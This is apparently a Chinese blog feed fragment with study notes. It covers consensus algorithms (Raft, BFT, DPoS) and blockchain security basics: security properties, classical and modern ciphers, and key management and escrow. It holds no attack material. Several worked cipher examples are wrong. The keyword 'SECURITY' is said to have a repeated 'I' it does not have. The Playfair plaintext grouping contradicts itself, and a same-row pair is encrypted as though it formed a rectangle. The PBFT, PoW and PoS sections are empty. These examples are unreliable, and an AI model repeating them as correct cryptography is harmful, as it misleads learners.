<p><strong>Raft算法为了清晰易懂，将分布式系统一致性共识问题分解为选举主节点（Leader Election）、日志复制（Log Replication）、安全性（Safety）、成员变更（Membership Changes）等几个子问题，每个子问题都可以独立求解，因此理解 Raft 算法只需要相对独立地弄清几个子问题即可。</strong></p>
<p><strong>Raft算法的局限性</strong></p>
<p>Raft算法有一个很强的前提就是Leader节点和Follower节点都必须按顺序投票。例如一个基于Raft算法的分布式数据库系统中，必须按照以下顺序处理事务：</p>
<p>  (1)主库节点按事务顺序发送事务日志；</p>
<p>  (2)备库节点按事务顺序持久化事务，并应答主库节点；</p>
<p>  (3)主库节点按事务顺序提交事务。</p>
<p>   如果不严格按照上述顺序，Raft算法的正确性无法得到保证。但是，对于高峰期每秒钟处理成千上万的事务的分布式数据库，可能会造成无法忽视的潜在性能和稳定性风险。此外，Raft算法的顺序投票策略也会对数据库的多表事务、故障恢复产生影响。</p>
<h3 id="拜占庭容错类共识算法（BFT）"><a href="#拜占庭容错类共识算法（BFT）" class="headerlink" title="拜占庭容错类共识算法（BFT）"></a><strong>拜占庭容错类共识算法</strong>（BFT）</h3><p><strong>拜占庭容错类共识算法能允许分布式系统节点发生任何类型的错误但错误节点数量不超过一定比例时，确保整个分布式系统的可靠性。</strong>简单的说，只要分布式系统的故障（由于非拜占庭错误或拜占庭错误导致）节点数与系统总节点数相比，小于一定比例，拜占庭容错类共识算法就能保证分布式系统的可靠性。由于像比特币、以太坊等区块链系统中，存在大量彼此不信任的网络节点，不排除有恶意节点企图伪造或篡改系统数据，因此，<strong>拜占庭容错类共识算法是区块链共识机制主要采用的共识算法</strong>。拜占庭容错类共识算法中最有代表性的包括PBFT实用拜占庭容错算法、PoW工作量证明算法、PoS权益证明算法等。</p>
<h4 id="PBFT实用拜占庭容错算法"><a href="#PBFT实用拜占庭容错算法" class="headerlink" title="PBFT实用拜占庭容错算法"></a><strong>PBFT实用拜占庭容错算法</strong></h4><p><strong>PBFT（Practical Byzantine Fault Tolerance）算法中文译为实用拜占庭容错算法，简称PBFT算法。</strong></p>
<p><strong>解决了原始拜占庭容错算法效率不高的问题，将算法复杂度由指数级降低到多项式级，使得在实际系统中解决拜占庭错误（Byzantine Failure）变得可行。</strong></p>
<p><strong>PBFT算法的原理</strong></p>
<h4 id="PoW工作量证明算法"><a href="#PoW工作量证明算法" class="headerlink" title="PoW工作量证明算法"></a><strong>PoW工作量证明算法</strong></h4><h4 id="PoS权益证明算法"><a href="#PoS权益证明算法" class="headerlink" title="PoS权益证明算法"></a><strong>PoS权益证明算法</strong></h4><h4 id="DPoS委托权益证明算法"><a href="#DPoS委托权益证明算法" class="headerlink" title="DPoS委托权益证明算法"></a><strong>DPoS委托权益证明算法</strong></h4><p><strong>DPoS算法的目的是</strong>为了解决PoW算法的性能与巨大算力资源消耗问题以及PoS算法后期可能出现的少数节点持有大量权益带来的中心化风险问题****。在DPoS算法中，保留了PoS算法的权益机制，借鉴了类似于股份制企业中董事会投票机制的方式，节点用持有的股份投票选出少量称为见证人的节点，这些见证人节点会代理其余节点完成区块的生成和验证。通过减少对确认数量的要求，DPoS算法大大提高了交易的性能。</p>
<p><strong>DPoS算法的原理</strong></p>
<p><strong>DPoS共识算法引入了一种类似民主代表大会的机制，系统中所有拥有权益的普通节点投票选举出代表自身权益的见证人节点来实际运营网络，见证人节点提供专业运行的网络服务器来保证区块链网络的安全和性能。</strong></p>
<p><strong>前提1</strong>：见证人节点必须代表普通节点行使区块链出块权利，如果见证人节点不称职，随时都可能被投票出局。</p>
<p><strong>前提2</strong>：见证人节点的数量是固定的，一般是奇数，取决于区块链系统的设计，如在EOS系统中有21个，Bitshares系统中有101个。</p>
<p><strong>DPoS算法中，区块链系统的节点被划分为普通节点、见证人节点两大类角色。</strong></p>
<p>   (1) 普通节点</p>
<p>​    普通节点又称为“权益相关者”节点，是系统中占比最大的节点类型，具有投票权和被选举权，普通节点持有的权益（如货币量、币龄）越多，投票的权重就越高。</p>
<p>   (2) 见证人节点</p>
<p>   见证人节点是被普通节点选举出来，代表广大普通节点为区块链添加新区块，执行记帐权利的节点。见证人节点一般会保持中立，维护区块链系统分布式帐本的安全，因为见证人节点始终处于普通节点（利益相关者）的选举控制之下，当见证人节点因不良行为（未记帐或签署无效区块等）时，会造成普通节点的权益损失，因此，普通节点可随时将其选票重新分配给其他见证人节点。</p>
<p><strong>见证人节点需要具体负责：</strong></p>
<ol>
<li><p>确保节点的正常运行；</p>
</li>
<li><p>收集区块链网络里的交易信息，验证交易，把交易打包到区块；</p>
</li>
<li><p>向所有见证人节点广播新区块，其它见证人节点验证后把区块添加到本地账本数据库中；</p>
</li>
<li><p>组织领导并促进区块链项目的发展，对区块链网络发展做出积极的贡献（如贡献代码、筹集资金、建立社群等）来不断提高声誉。</p>
</li>
</ol>
<p><strong>DPoS算法参考流程如下：</strong></p>
<p>  <strong>(1) 新节点加入系统作为普通节点运行；</strong></p>
<p>  <strong>(2) 系统各节点投票选出固定数量的见证人节点；</strong></p>
<p>  <strong>(3) 系统对见证人节点进行排序；</strong></p>
<p>  <strong>(4) 见证人节点按照排序，根据系统规定的时间间隔（如EOS系统为0.5秒）轮流生成新区块，如果见证人节点没有成功生成区块，则跳过该见证人节点，由下一见证人节点继续生成区块；</strong></p>
<p>  <strong>(5) 根据见证人节点的排序，新生成的区块交由后续的见证人节点进行区块验证，一个新区块得到超过2&#x2F;3个见证人节点的验证确认后，才能被正式加入到区块链中。</strong></p>
<p><strong>DPoS算法的局限性</strong></p>
<p> (1) DPoS算法中选举少数见证人节点代表其它节点生产区块，系统长期运行下去，可能导致少数见证人节点获得的权益激励积累远远多于其它节点，当见证人节点拥有的权益过多时，就拥有了控制见证节点选举的能力，进而破坏选举的民主性。</p>
<p> (2) DPoS算法中被选举出来的见证人节点可能是恶意节点，当恶意节点不能成功生成区块时，DPoS算法只是选择跳过该节点由下一节点继续生产区块，并且只寄希望于在后续通过投票的方式将其从见证人节点集合中淘汰。缺乏对恶意节点的惩罚措施，该节点仍然可以参与后续的共识过程和见证人节点竞选，继续影响着区块链系统的安全性。</p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链安全基础一</title>
    <url>/2024/10/30/%E9%93%BE%E5%AE%891/</url>
    <content><![CDATA[<h5 id="关键词：信息安全-网络安全-（非）对称加密-密钥管理技术"><a href="#关键词：信息安全-网络安全-（非）对称加密-密钥管理技术" class="headerlink" title="关键词：信息安全  网络安全  （非）对称加密   密钥管理技术"></a>关键词：信息安全  网络安全  （非）对称加密   密钥管理技术</h5><h2 id="一-信息安全知识基础"><a href="#一-信息安全知识基础" class="headerlink" title="一. 信息安全知识基础"></a>一. 信息安全知识基础</h2><h3 id="1-1-信息安全定义-特征"><a href="#1-1-信息安全定义-特征" class="headerlink" title="1.1 信息安全定义&amp;特征"></a>1.1 信息安全定义&amp;特征</h3><h4 id="1-1-1信息安全的定义："><a href="#1-1-1信息安全的定义：" class="headerlink" title="1.1.1信息安全的定义："></a>1.1.1信息安全的定义：</h4><p>​	a. 信息系统的安全（也称实体安全，系统运行的安全）</p>
<p>​	b. 特定信息体系的安全</p>
<ul>
<li>系统中信息的安全（用户权限的限制，数据加密）</li>
<li>管理安全（对信息资源和系统运行的管理）</li>
</ul>
<h4 id="1-1-2信息安全的特征"><a href="#1-1-2信息安全的特征" class="headerlink" title="1.1.2信息安全的特征"></a><span style="color: red;">1.1.2信息安全的特征</span></h4><p><strong>a. 保密性</strong></p>
<p><strong>b. 完整性</strong></p>
<p><strong>c. 可用性</strong></p>
<p><strong>d. 可控性</strong></p>
<p><strong>e. 可审查性</strong></p>
<h4 id="关于五种特征的解释："><a href="#关于五种特征的解释：" class="headerlink" title="关于五种特征的解释："></a>关于五种特征的解释：</h4><p>（1）保密性：保密性是指信息<span style="color: blue;">不泄漏给非授权的个人、实体和过程，或供其使用的特性。</span><br>（2）完整性：完整性是指信息<span style="color: blue;">未经授权不能被修改、不被破坏、不被插入、不延迟、不乱序和不丢失的特性。</span>对网络信息安全进行攻击其最终目的就是破坏信息的完整性。<br>（3） 可用性：可用性是指合法用户访问并能<span style="color: blue;">按要求顺序使用信息的特性</span>，即保证合法用户在需要时可以访问到信息及相关资产。<br>（4）可控性：可控性是指授权机构<span style="color: blue;">对信息的内容及传播具有控制能力的特性</span>，可以控制授权范围内的信息流向以及方式。<br>（5）可审查性（抗抵赖性）：在信息交流过程结束后，通信双方<span style="color: blue;">不能抵赖曾经做出的行为，也不能否认曾经接收到对方的信息。</span></p>
<h3 id="1-2-网络安全的定义-特征"><a href="#1-2-网络安全的定义-特征" class="headerlink" title="1.2 网络安全的定义&amp;特征"></a>1.2 网络安全的定义&amp;特征</h3><h5 id="1-2-1-网安定义"><a href="#1-2-1-网安定义" class="headerlink" title="1.2.1 网安定义"></a>1.2.1 网安定义</h5><p>a. 硬件安全</p>
<p>b. 软件安全</p>
<p>c.系统中数据的安全</p>
<h5 id="1-2-2网安特征"><a href="#1-2-2网安特征" class="headerlink" title="1.2.2网安特征"></a>1.2.2网安特征</h5><p>a.保密性</p>
<p>b.完整性</p>
<p>c.可用性</p>
<p>d.可控性</p>
<h3 id="1-3-网络信息安全技术需求"><a href="#1-3-网络信息安全技术需求" class="headerlink" title="1.3 网络信息安全技术需求"></a>1.3 网络信息安全技术需求</h3><h5 id="1-3-1-网络物理安全（实体安全）"><a href="#1-3-1-网络物理安全（实体安全）" class="headerlink" title="1.3.1 网络物理安全（实体安全）"></a>1.3.1 网络物理安全（实体安全）</h5><p>​	指所有支持网络系统运行的硬件总体安全。</p>
<p>​	物理安全的需求主要有：</p>
<ul>
<li>环境安全</li>
<li>设备安全（物理防备）</li>
<li>媒体安全（媒体数据&amp;媒体本身）</li>
</ul>
<h5 id="1-3-2网络认证"><a href="#1-3-2网络认证" class="headerlink" title="1.3.2网络认证"></a>1.3.2网络认证</h5><p>​	定义：实现网络资源访问控制的前提和依据。</p>
<p>​	作用：标识，鉴别网络资源访问者身份的真实性</p>
<h5 id="1-3-3-网络访问控制"><a href="#1-3-3-网络访问控制" class="headerlink" title="1.3.3 网络访问控制"></a>1.3.3 网络访问控制</h5><p>​	网络访问控制是有效保护网络管理对象，使其免受关键技术方法。其目标主要有两个：<br>​	（1）限制非法用户获取或使用网络资源。<br>​	（2） 防止合法用户滥用权限，越权访问网络资源。</p>
<h5 id="1-3-4网络安全保密"><a href="#1-3-4网络安全保密" class="headerlink" title="1.3.4网络安全保密"></a>1.3.4网络安全保密</h5><p>​	目的： 就是防止非授权的用户访问网上信息或网络设备。</p>
<p>​	为此，重要的网络物理实体能够采用辐射干扰机技术，防止通过电磁辐射泄露机密信息。</p>
<h5 id="1-3-5网络安全监测"><a href="#1-3-5网络安全监测" class="headerlink" title="1.3.5网络安全监测"></a>1.3.5网络安全监测</h5><p>​	作用： 发现系统入侵活动和检查安全保护措施的有效性，以便及时报警给网安管理员</p>
<h5 id="1-3-6网络漏洞评估"><a href="#1-3-6网络漏洞评估" class="headerlink" title="1.3.6网络漏洞评估"></a>1.3.6网络漏洞评估</h5><p>​	作用： 扫描弱点&amp;漏洞</p>
<h5 id="1-3-7-防范网络恶意代码"><a href="#1-3-7-防范网络恶意代码" class="headerlink" title="1.3.7 防范网络恶意代码"></a>1.3.7 防范网络恶意代码</h5><h5 id="1-3-8-网络安全应急响应"><a href="#1-3-8-网络安全应急响应" class="headerlink" title="1.3.8 网络安全应急响应"></a>1.3.8 网络安全应急响应</h5><h5 id="1-3-9-网络安全体系"><a href="#1-3-9-网络安全体系" class="headerlink" title="1.3.9 网络安全体系"></a>1.3.9 网络安全体系</h5><p>​	网络安全的实现不仅仅取决于某项技术，而是依赖于一个网络信息安全体系的建立，这个体系包括安全组织机构、安全制度、安全管理流程、安全人员意识等。通过安全体系的建立，可以在最大程度上实现网络的整体安全，满足企业或单位安全发展的要求。</p>
<h5 id="1-4-信息安全策略"><a href="#1-4-信息安全策略" class="headerlink" title="1.4 信息安全策略"></a>1.4 信息安全策略</h5><ul>
<li>物理安全</li>
<li>访问控制</li>
<li>防火墙</li>
<li>信息加密</li>
<li>网络安全管理</li>
</ul>
<h5 id="1-5-相关法律"><a href="#1-5-相关法律" class="headerlink" title="1.5 相关法律"></a>1.5 相关法律</h5><h2 id="二-密码学基础"><a href="#二-密码学基础" class="headerlink" title="二. 密码学基础"></a>二. 密码学基础</h2><h3 id="2-1-密码基本知识"><a href="#2-1-密码基本知识" class="headerlink" title="2.1 密码基本知识"></a>2.1 密码基本知识</h3><p><img src="https://s2.loli.net/2024/11/03/56aczxuvg3BOFyU.jpg" alt="1.jpg"></p>
<h3 id="2-2-古典密码体制"><a href="#2-2-古典密码体制" class="headerlink" title="2.2 古典密码体制"></a>2.2 古典密码体制</h3><h4 id="2-2-1-单表密码"><a href="#2-2-1-单表密码" class="headerlink" title="2.2.1 单表密码"></a>2.2.1 单表密码</h4><p>（仅个人兴趣列出 非必须掌握）</p>
<ul>
<li><strong>凯撒密码</strong></li>
</ul>
<p>该算法表示为： </p>
<p><img src="https://s2.loli.net/2024/11/03/lOFKSTxvZR8siun.jpg" alt="2.jpg"></p>
<p>（c代表密文，p代表明文）</p>
<ul>
<li><p><strong>仿射密码</strong></p>
<p>仿射密码的主要特点是使用一个线性函数进行加密和解密。</p>
<p>加密过程：</p>
<p>在仿射密码中，字符通过以下公式进行加密：</p>
<p>E(x)&#x3D;(ax+b) mod  m </p>
<ul>
<li><p>E(x)：加密后的字符</p>
</li>
<li><p>x：原字符在字母表中的位置（例如，A&#x3D;0，B&#x3D;1，C&#x3D;2，…，Z&#x3D;25）</p>
</li>
<li><p>a 和 b：密钥，其中 a必须与字母表的大小 m <strong>互质</strong></p>
</li>
<li><p>m：字母表的大小（例如，对于英文字母，m&#x3D;26）</p>
</li>
</ul>
<p>假设我们选择 a&#x3D;5 和 b&#x3D;8，加密字母 “C”：</p>
<ol>
<li><p>C 的位置 x&#x3D;2</p>
</li>
<li><p>加密：E(2)&#x3D;(5⋅2+8)mod  26&#x3D;18</p>
</li>
<li><p>对应字母为 “S”</p>
</li>
</ol>
</li>
<li><p><strong>乘法密码</strong></p>
<p>加密公式为：</p>
<p>E(x)&#x3D;(a⋅x)mod  m</p>
<ul>
<li>E(x)：加密后的字符</li>
<li>x：原字符在字母表中的位置（例如，A&#x3D;0，B&#x3D;1，C&#x3D;2，…，Z&#x3D;25）</li>
<li>a：密钥，且必须与字母表的大小 m 互质</li>
<li>m：字母表的大小（对于英文字母，m&#x3D;26）</li>
</ul>
</li>
<li><p><strong>密钥词组密码</strong></p>
</li>
</ul>
<h6 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h6><ol>
<li><h6 id="选择密钥词组：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。"><a href="#选择密钥词组：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。" class="headerlink" title="选择密钥词组：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。"></a><strong>选择密钥词组</strong>：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。</h6><p>例如，如果选择的密钥词组是 “SECURITY”，则变为 “SECURIT”（去掉重复的 “I”）。</p>
</li>
<li><h6 id="生成替代字母表：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。"><a href="#生成替代字母表：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。" class="headerlink" title="生成替代字母表：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。"></a><strong>生成替代字母表</strong>：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。</h6><ul>
<li><p>密钥字母：S E C U R I T</p>
</li>
<li><p>剩余字母：A B D F G H J K L M N O P Q V W X Y Z</p>
</li>
<li><p>生成的替代字母表：</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">S</span> <span class="built_in">E</span> <span class="built_in">C</span> <span class="variable">U</span> <span class="variable">R</span> <span class="built_in">I</span> <span class="variable">T</span> <span class="variable">A</span> <span class="variable">B</span> <span class="built_in">D</span> <span class="variable">F</span> <span class="variable">G</span> <span class="variable">H</span> <span class="variable">J</span> <span class="built_in">K</span> <span class="variable">L</span> <span class="variable">M</span> <span class="built_in">N</span> <span class="built_in">O</span> <span class="variable">P</span> <span class="variable">Q</span> <span class="variable">V</span> <span class="variable">W</span> <span class="variable">X</span> <span class="variable">Y</span> <span class="variable">Z</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>加密文本</strong>：用原字母表的字母替换为替代字母表中的字母。</p>
</li>
</ol>
<h4 id="2-2-2-多表密码"><a href="#2-2-2-多表密码" class="headerlink" title="2.2.2 多表密码"></a>2.2.2 多表密码</h4><p>2.2.2.1<strong>普拉斐尔密码</strong></p>
<h6 id="加密过程-1"><a href="#加密过程-1" class="headerlink" title="加密过程"></a>加密过程</h6><ol>
<li><p><strong>选择密钥</strong>：选择一个密钥词（例如 “PLAYFAIR”），去掉重复字母并将其填入一个5x5的矩阵中。</p>
</li>
<li><p><strong>填充矩阵</strong>：在密钥的基础上，依次填入剩余字母（通常将 “I” 和 “J” 合并为一个字母，矩阵中只使用一个）。</p>
<p>例如，使用 “PLAYFAIR” 作为密钥，矩阵为：</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">P</span> <span class="variable">L</span> <span class="variable">A</span> <span class="variable">Y</span> <span class="variable">F</span></span><br><span class="line"><span class="built_in">I</span> <span class="variable">R</span> <span class="variable">B</span> <span class="built_in">C</span> <span class="built_in">D</span></span><br><span class="line"><span class="built_in">E</span> <span class="variable">G</span> <span class="variable">H</span> <span class="built_in">K</span> <span class="variable">M</span></span><br><span class="line"><span class="built_in">N</span> <span class="built_in">O</span> <span class="variable">Q</span> <span class="variable">S</span> <span class="variable">T</span></span><br><span class="line"><span class="variable">U</span> <span class="variable">V</span> <span class="variable">W</span> <span class="variable">X</span> <span class="variable">Z</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>准备明文</strong>：将明文按两两分组。如果有重复的字母，插入一个填充字母（通常使用 “X”）。如果最后一组只有一个字母，则在其后添加一个填充字母。</p>
<p>例如，明文 “HELLO” 变为 “HE LL OX”（分组为 “HE”, “LX”, “OX”）。</p>
</li>
<li><p><strong>加密规则</strong>：</p>
<ul>
<li><strong>同列</strong>：如果两个字母在同一列中，则用其下方的字母替换（循环回到顶部）。</li>
<li><strong>同行</strong>：如果两个字母在同一行中，则用其右边的字母替换（循环回到左边）。</li>
<li><strong>不同行不列</strong>：如果两个字母在矩阵的不同位置，形成一个矩形，则用矩形的对角字母替换。</li>
</ul>
<p>例如，加密 “HE”：</p>
<ul>
<li>H(第3行第3列) 和 E(第3行第1列) 形成一个矩形，加密为 “BK”。</li>
</ul>
</li>
<li><p><strong>重复上述步骤</strong>：对所有分组进行加密。</p>
<h6 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h6><p>解密过程与加密过程相反，使用相同的矩阵和规则：</p>
<ul>
<li><strong>同列</strong>：用上方的字母替换。</li>
<li><strong>同行</strong>：用左边的字母替换。</li>
<li><strong>不同行不列</strong>：用矩形的对角字母替换。</li>
</ul>
</li>
</ol>
<p>2.2.2.2 <strong>维吉尼亚密码</strong></p>
<h6 id="加密过程-2"><a href="#加密过程-2" class="headerlink" title="加密过程"></a>加密过程</h6><ol>
<li><p><strong>选择关键词</strong>：选择一个关键词（例如 “KEY”），并将其重复直到与明文长度相同。</p>
</li>
<li><p><strong>明文和关键词对齐</strong>：将明文与关键词字符逐一对齐。</p>
<p>例如，明文为 “HELLO WORLD”，关键词为 “KEY”，对齐后：</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">H</span> <span class="built_in">E</span> <span class="variable">L</span> <span class="variable">L</span> <span class="built_in">O</span>   <span class="variable">W</span> <span class="built_in">O</span> <span class="variable">R</span> <span class="variable">L</span> <span class="built_in">D</span></span><br><span class="line"><span class="built_in">K</span> <span class="built_in">E</span> <span class="variable">Y</span> <span class="built_in">K</span> <span class="built_in">E</span>   <span class="built_in">K</span> <span class="built_in">E</span> <span class="variable">Y</span> <span class="built_in">K</span> <span class="built_in">E</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/11/03/bHRra7AINk1tPdD.png" alt="3.png"></p>
</li>
</ol>
<h6 id="解密过程-1"><a href="#解密过程-1" class="headerlink" title="解密过程"></a>解密过程</h6><p>解密过程与加密过程相似，但公式反转：</p>
<p><img src="https://s2.loli.net/2024/11/03/q1U9GD8TaLpnvcu.png" alt="4.png"></p>
<h6 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h6><p>假设明文为 “HELLO WORLD”，关键词为 “KEY”：</p>
<ol>
<li><strong>重复关键词</strong>：将 “KEY” 重复，得到 “KEYKEYKEYK”。</li>
<li><strong>对齐并加密</strong>：<ul>
<li>H (7) + K (10) &#x3D; R (17)</li>
<li>E (4) + E (4) &#x3D; I (8)</li>
<li>L (11) + Y (24) &#x3D; J (9)</li>
<li>L (11) + K (10) &#x3D; V (21)</li>
<li>O (14) + E (4) &#x3D; S (18)</li>
<li>空格不加密</li>
<li>W (22) + K (10) &#x3D; G (6)</li>
<li>O (14) + E (4) &#x3D; S (18)</li>
<li>R (17) + Y (24) &#x3D; P (15)</li>
<li>L (11) + K (10) &#x3D; V (21)</li>
<li>D (3) + E (4) &#x3D; H (7)</li>
</ul>
</li>
</ol>
<p>最终加密结果为 “RIJVS GSPVH”。</p>
<p>2.2.2.3 <strong>希尔密码</strong></p>
<p><img src="https://s2.loli.net/2024/11/03/Cq2mW3LQolaReDz.png" alt="5.png"></p>
<h3 id="2-3-现代密码体制"><a href="#2-3-现代密码体制" class="headerlink" title="2.3 现代密码体制"></a>2.3 现代密码体制</h3><h4 id="2-3-1-对称密码体制"><a href="#2-3-1-对称密码体制" class="headerlink" title="2.3.1 对称密码体制"></a>2.3.1 对称密码体制</h4><p>加密解密用同一把密钥 or 两把密钥之间可以推理出来</p>
<p><span style = "color: red;">对称加密算法的优点：</span></p>
<ol>
<li><span style = "color: red;">加，解密处理速度快</span></li>
<li><span style = "color: red;">保密度高</span></li>
</ol>
<p><span style = "color: red;">对称加密算法的缺点：</span></p>
<ol>
<li><span style = "color: red;">密钥分发困难</span></li>
<li><span style = "color: red;">密钥管理困难</span></li>
</ol>
<p><strong>举例：</strong></p>
<p>数据加密标准(DES)算法：</p>
<p><img src="https://s2.loli.net/2024/11/03/N4viyfzdRVm5ehU.jpg" alt="6.jpg"></p>
<p><img src="https://s2.loli.net/2024/11/03/71Kphrfctyk2iWJ.jpg" alt="7.jpg"></p>
<p>DES算法特点：<br>（1）分组加密算法：以64位为分组，64位一组明文输入，<br>64位密文输出。<br>（2） 对称算法：加密和解密用同一密钥。<br>（3）有效密钥长度为56位：密钥通常表示为64位数，但每个第8位都用作奇偶校验，可以忽略。<br>（4）代替和置换：DES算法是两种加密技术的组合，先代替后置换。<br>（5） 易于实现：DES算法只是使用了标准的算术和逻辑运算，其作用的数最多也只有64位，并且，算法的重复特性使得它可以非常理想地在一个专用芯片中实现</p>
<p><strong><span style = "color: orange;">2.3.2 非对称密码体制</span></strong></p>
<p>加密解密用不同密钥 or 两把密钥之间很难推理出来</p>
<p><span style = "color: red;">非对称加密算法的优点：</span></p>
<pre><code> 1. &lt;span style = &quot;color: red;&quot;&gt;密钥分发简单&lt;/span&gt;
 2. &lt;span style = &quot;color: red;&quot;&gt;密钥管理便捷&lt;/span&gt;
 3. &lt;span style = &quot;color: red;&quot;&gt;可以实现签名&lt;/span&gt;
</code></pre>
<p><span style = "color: red;">非对称加密算法的缺点：</span></p>
<ol>
<li><span style = "color: red;">加密解密处理速度较慢</span></li>
<li><span style = "color: red;">同等安全强度下公钥密码体制的密钥位数要求多一些</span></li>
</ol>
<p><strong>举例：</strong></p>
<ul>
<li>RSA密钥生成原理</li>
<li>EIGamal公钥密码技术</li>
<li>椭圆曲线密码技术</li>
</ul>
<p>[具体解释等如果到时候我再遇到就去查了补充在这里QwQ]</p>
<h2 id="三-密钥管理技术"><a href="#三-密钥管理技术" class="headerlink" title="三.密钥管理技术"></a>三.密钥管理技术</h2><p><img src="https://s2.loli.net/2024/11/03/fAnc8R6hPg4VpGx.png" alt="8.png"></p>
<p><strong>一个完整的保密通信系统</strong></p>
<p>由</p>
<ol>
<li><p>密码体制（密码算法，及所有的明文，密文和密钥）</p>
</li>
<li><p>信源</p>
</li>
<li><p>信宿</p>
</li>
<li><p>攻击者</p>
</li>
</ol>
<p>构成。</p>
<p>  加解密算法一般都是公开的，所有的密码技术都依赖于密钥。当密码算法确定后，密码系统的保密程度就完全取决于密钥的保密程度。</p>
<p><strong>密钥管理定义</strong></p>
<p>密钥管理涉及密钥的产生和存储、分发、使用、更新（替换）、备份和恢复、以及撤销和销毁等，涵盖了密钥的整个生存周期。</p>
<h5 id="密钥管理目的"><a href="#密钥管理目的" class="headerlink" title="密钥管理目的"></a><strong>密钥管理目的</strong></h5><ol>
<li>确保密钥的安全性</li>
<li>确保密钥的有效性</li>
<li>密钥的分发和分享</li>
<li>密钥的更新和轮换</li>
<li>密钥的备份和恢复</li>
<li>监控和审计</li>
</ol>
<h3 id="3-1-密钥的类型和组织结构"><a href="#3-1-密钥的类型和组织结构" class="headerlink" title="3.1 密钥的类型和组织结构"></a>3.1 密钥的类型和组织结构</h3><h4 id="3-1-1-关于密钥长度"><a href="#3-1-1-关于密钥长度" class="headerlink" title="3.1.1 关于密钥长度"></a>3.1.1 关于密钥长度</h4><p>​	密钥是安全通信的必要长度之一</p>
<p>长度决定因素：</p>
<ol>
<li>数据价值</li>
<li>所需安全期</li>
<li>攻击者资源情况</li>
<li>计算机计算能力</li>
<li>加密算法的发展</li>
</ol>
<h4 id="3-1-2密钥的产生与存储"><a href="#3-1-2密钥的产生与存储" class="headerlink" title="3.1.2密钥的产生与存储"></a>3.1.2密钥的产生与存储</h4><p>产生与生成算法有关：大部分采用随机或伪随机过程</p>
<p>存储：有无介质，记录介质，物理介质等几种</p>
<h4 id="3-1-3密钥的使用-更新（替换）"><a href="#3-1-3密钥的使用-更新（替换）" class="headerlink" title="3.1.3密钥的使用&amp;更新（替换）"></a>3.1.3密钥的使用&amp;更新（替换）</h4><p>密钥的使用是指从存储介质上获得密钥，进行加密和解密的技术活动。</p>
<p>密钥的更新和替换是指定期更换密钥，以增强系统的安全性和保护密钥的长期有效性</p>
<h4 id="3-1-4密钥的备份与恢复"><a href="#3-1-4密钥的备份与恢复" class="headerlink" title="3.1.4密钥的备份与恢复"></a>3.1.4密钥的备份与恢复</h4><p>备份：在密钥使用期内，存储一个受保护的拷贝，用于恢复遭到破坏的密钥</p>
<p>恢复：当一个密钥由于某种原因被破坏了，在还没有泄露出去以前，从它的一个备份重新得到密钥的过程 </p>
<h4 id="3-1-5密钥的销毁和撤销"><a href="#3-1-5密钥的销毁和撤销" class="headerlink" title="3.1.5密钥的销毁和撤销"></a>3.1.5密钥的销毁和撤销</h4><p>销毁：一般针对公钥证书所对应的密钥，撤销后密钥不再具备使用效力。</p>
<p><strong>自然撤销：当证书到期时</strong></p>
<p><strong>按需撤销</strong></p>
<p>密钥更换后，原来的密钥必须销毁。密钥不再使用时，该密钥所有的拷贝都必须删除，生成或构造该密钥的所有信息也应该被全部删除。</p>
<h3 id="3-2-密钥托管技术"><a href="#3-2-密钥托管技术" class="headerlink" title="3.2 密钥托管技术"></a>3.2 密钥托管技术</h3><p><strong>定义</strong>：提供一种密钥备份与恢复的途径，也称为托管加密</p>
<p><strong>实现手段</strong>：把加密的数据和数据恢复密钥联系起来，通过一个防窜扰的托管加密芯片（Clipper芯片）来实现，该技术包括两个主要的核心内容：</p>
<ul>
<li>skipjack加密算法</li>
<li>LEAF</li>
</ul>
<p>密钥托管技术在具体实施时有<strong>三个主要环节</strong>：生产托管Clipper芯片、用芯片加密通信、无密钥存取</p>
<p><strong>技术组成</strong>：USC  KEC  DRC</p>
<p>（这几个模块的相互关系：这几个模块的相互 关系：USC用密钥K加密明文，并且在传送的同时传送一个数据 恢复域DRF（Data Recovery Field）， DRC则从KEC提供的和DRF 中包含的信息中恢复出密钥K来解密密文。）</p>
<p><img src="https://s2.loli.net/2024/11/03/B2UZmvDspiuQwPE.jpg" alt="9.jpg"></p>
<p><strong>1.USC</strong>：<br>(1)USC: USC由软件、硬件组成(一般情况下，硬件比 软件安全、不易发生窜扰)，提供数据加密&#x2F;解密的能力，执 行支持数据恢复的操作，同时也支持密钥托管。这种支持体 <span style = "color: blue;">现在将数据恢复域(DRF)附加到数据上</span>。</p>
<p>USC的功能表现在以下几个方面:<br>1 提供具有数据加解密能力的算法及支持密钥托管功能的硬 件或相关软件。<br>2 提供通信(包括电话、电子邮件及其他类型的通信，由相 关部⻔在法律许可的条件下对通信的监听后执行对突发事件 的解密)和数据存储的密钥托管。<br>3 提供突发解密的识别符(包括用户或USC的识别符、密钥 的识别符、KEC或托管代理机构的识别符)和密钥(包括属 于芯片单元密钥KEC所使用的全局系统密钥，密钥还可以是 公钥或私钥，私钥的备份以托管的方式有托管机构托管)。</p>
<p><strong>2.KEC</strong>：<br>(2)KEC:可以作为公钥证书密钥管理系统的组成部分，也 可以作为<span style = "color: blue;">通用密钥管理的基础部分</span>。它由密钥管理机构控制， 主要用于向DRC提供所需的数据和服务，管理着<span style = "color: blue;">数据恢复密钥 的存储、传送和使用</span>。数据恢复密钥主要用于生成数据加密密 钥，因此在使用托管密码加密时，<span style = "color: blue;">所有的托管加密数据都应与 被托管的数据恢复密钥联系起来</span>。</p>
<p>数据恢复密钥主要由以下内容组成:</p>
